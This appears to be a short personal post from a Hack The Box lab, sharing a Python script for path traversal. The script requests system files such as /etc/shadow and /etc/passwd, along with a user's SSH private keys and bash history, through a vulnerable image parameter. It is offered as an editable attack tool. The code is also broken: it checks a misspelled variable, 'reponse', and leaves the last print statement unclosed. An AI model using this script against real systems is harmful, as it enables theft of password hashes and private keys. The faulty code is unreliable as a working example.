### 20-03-23
### Hack The Box - Path Traversal

Whilst the path can change for path traversal the majority of the time its the same files your interested in.

ive compiled a small list and added them to a python script that can be edited to fit the requirements.


### path-traversal.py
```python
import requests

host                = "test.htb"                                                    #edit this!
path_to_traverse    = "http://"+host+"/vurn.php?img=../../../../../../../../../"    #edit this!
user                = "admin"                                                       #edit this!
local_files         = ["/etc/passwd","/etc/hosts","/etc/hostname","/etc/crontab","/etc/shadow"]
user_files          = ["/.ssh/id_rsa","/.ssh/authorized_keys","/.bash_history","/.ssh/id_dsa","/.ssh/id_ecdsa","/.ssh/id_ed25519"]

headers = {
    'Host': host,
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
    'Connection': 'close',
    'Upgrade-Insecure-Requests': '1',
}

for file in local_files:
    response = requests.get(path_to_traverse+str(file),headers=headers,verify=False,)
    if reponse.text:
        print (file)
        print (response.text)
        print ("--------------------------------------------------")

for path in user_files:
    response = requests.get(path_to_traverse+"/home/"+ user + path ,headers=headers,verify=False,)
    if reponse.text:
        print ("/home/"+ user + path)
        print (response.text)
        print ("--------------------------------------------------"
```
